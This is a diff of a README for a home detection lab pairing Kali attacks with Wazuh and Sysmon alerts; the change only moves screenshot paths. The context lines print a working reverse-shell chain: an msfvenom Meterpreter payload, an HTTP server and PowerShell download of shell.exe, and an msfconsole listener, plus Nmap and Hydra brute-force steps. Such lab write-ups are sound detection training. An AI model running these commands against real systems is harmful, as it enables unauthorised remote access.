@@ -10,7 +10,7 @@ on Ubuntu — all mapped to the MITRE ATT&CK framework.
 
 ## Lab Architecture
 
-![Lab Architecture](lab-architecture.png)
+![Lab Architecture](screenshots/lab-architecture.png)
 
 | VM | Role | OS |
 |----|------|----|
@@ -41,42 +41,42 @@ on Ubuntu — all mapped to the MITRE ATT&CK framework.
 
 ### Step 1 — Ubuntu System Update
 Updated Ubuntu before Wazuh installation to ensure clean environment.
-![Ubuntu Update](ubuntu-update.png)
+![Ubuntu Update](screenshots/ubuntu-update.png)
 
 ### Step 2 — Wazuh Installation on Ubuntu
 Installed Wazuh all-in-one (Manager + Indexer + Dashboard) using the
 official installation script.
 
-![Wazuh Installation](wazuh-installation.png)
-![Wazuh Installation Complete](wazuh-installation-complete.png)
+![Wazuh Installation](screenshots/wazuh-installation.png)
+![Wazuh Installation Complete](screenshots/wazuh-installation-complete.png)
 
 ### Step 3 — Wazuh Dashboard Access
 Accessed Wazuh web dashboard after successful installation.
 
-![Wazuh Login](wazuh-login-page.png)
-![Wazuh Dashboard](wazuh-dashboard.png)
+![Wazuh Login](screenshots/wazuh-login-page.png)
+![Wazuh Dashboard](screenshots/wazuh-dashboard.png)
 
 ### Step 4 — Sysmon Installation on Windows
 Installed Sysmon with SwiftOnSecurity config for deep Windows event
 monitoring before deploying Wazuh Agent.
 
-![Sysmon Installation](sysmon-installation-in-windows.png)
+![Sysmon Installation](screenshots/sysmon-installation-in-windows.png)
 
 ### Step 5 — Deploying Wazuh Agent from Server
 Generated agent deployment commands from Wazuh server dashboard.
 
-![Deploying Agent](deploying-agent-01.png)
-![Agent Commands](deploying-agent-02.png)
+![Deploying Agent](screenshots/deploying-agent-01.png)
+![Agent Commands](screenshots/deploying-agent-02.png)
 
 ### Step 6 — Installing Agent on Windows
 Ran the agent installation commands in Windows PowerShell.
 
-![Installing Agent on Windows](installing-agent-on-windows.png)
+![Installing Agent on Windows](screenshots/installing-agent-on-windows.png)
 
 ### Step 7 — Agent Active Verification
 Verified Windows agent is connected and active in Wazuh dashboard.
 
-![Agent Active](verifying-agent-01.png)
+![Agent Active](screenshots/verifying-agent-01.png)
 
 ### Step 8 — Adding Sysmon to ossec.conf
 Configured Wazuh agent to collect Sysmon logs by adding localfile block
@@ -89,12 +89,12 @@ in ossec.conf — this enables Sysmon alerts to flow to Wazuh server.
 </localfile>
 ```
 
-![ossec.conf Configuration](adding-sysmon-to-ossec.conf.png)
+![ossec.conf Configuration](screenshots/adding-sysmon-to-ossec.conf.png)
 
 ### Step 9 — Restarting Wazuh Service on Windows
 Restarted WazuhSvc after ossec.conf changes to apply configuration.
 
-![Restarting Service](restarting-wazuh-service-in-windows.png)
+![Restarting Service](screenshots/restarting-wazuh-service-in-windows.png)
 
 ---
 
@@ -103,7 +103,7 @@ Restarted WazuhSvc after ossec.conf changes to apply configuration.
 ### Network Connectivity Verification
 Verified Kali can reach Windows target before launching attacks.
 
-![Kali to Windows Ping](kali-to-windows-ping.png)
+![Kali to Windows Ping](screenshots/kali-to-windows-ping.png)
 
 ---
 
@@ -120,11 +120,11 @@ Verified Kali can reach Windows target before launching attacks.
 
 **Attack Execution — Kali:**
 
-![Nmap Scan](nmap-scan.png)
+![Nmap Scan](screenshots/nmap-scan.png)
 
 **Alert Detected — Wazuh:**
 
-![Nmap Alert](nmap-scan-alert.png)
+![Nmap Alert](screenshots/nmap-scan-alert.png)
 
 ---
 
@@ -142,11 +142,11 @@ Verified Kali can reach Windows target before launching attacks.
 
 **Attack Execution — Kali:**
 
-![Hydra Attack](hydra-brute-force.png)
+![Hydra Attack](screenshots/hydra-brute-force.png)
 
 **Alert Detected — Wazuh:**
 
-![Hydra Alert](hydra-brute-force-alert.png)
+![Hydra Alert](screenshots/hydra-brute-force-alert.png)
 
 > Wazuh generated 15 authentication_failed alerts within 60 seconds
 > of Hydra attack — real-time detection confirmed.
@@ -167,19 +167,19 @@ Verified Kali can reach Windows target before launching attacks.
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.23.128 LPORT=4444 -f exe > shell.exe
 ```
-![Payload Generation](metasploit-reverse-shell-01.png)
+![Payload Generation](screenshots/metasploit-reverse-shell-01.png)
 
 **Phase 2 — HTTP Server to Deliver Payload:**
 ```bash
 python3 -m http.server 8080
 ```
-![HTTP Server](metasploit-reverse-shell-01.png)
+![HTTP Server](screenshots/metasploit-reverse-shell-01.png)
 
 **Phase 3 — Payload Download on Windows:**
 ```powershell
 Invoke-WebRequest -Uri "http://192.168.23.128:8080/shell.exe" -OutFile "C:\shell.exe"
 ```
-![Windows Download](metasploit-reverse-shell-02.png)
+![Windows Download](screenshots/metasploit-reverse-shell-02.png)
 
 **Phase 4 — Listener Setup on Kali (msfconsole):**
 ```bash
@@ -189,16 +189,16 @@ set LHOST 192.168.23.128
 set LPORT 4444
 run
 ```
-![Listener](metasploit-reverse-shell-03.png)
+![Listener](screenshots/metasploit-reverse-shell-03.png)
 
 **Phase 5 — Payload Executed on Windows + Meterpreter Session:**
 
-![Payload Executed on Windows](metasploit-reverse-shell-04.png)
-![Meterpreter Session](metasploit-reverse-shell-05.png)
+![Payload Executed on Windows](screenshots/metasploit-reverse-shell-04.png)
+![Meterpreter Session](screenshots/metasploit-reverse-shell-05.png)
 
 **Alert Detected — Wazuh:**
 
-![Metasploit Alert](metasploit-reverse-shell-alert.png)
+![Metasploit Alert](screenshots/metasploit-reverse-shell-alert.png)
 
 ---
 
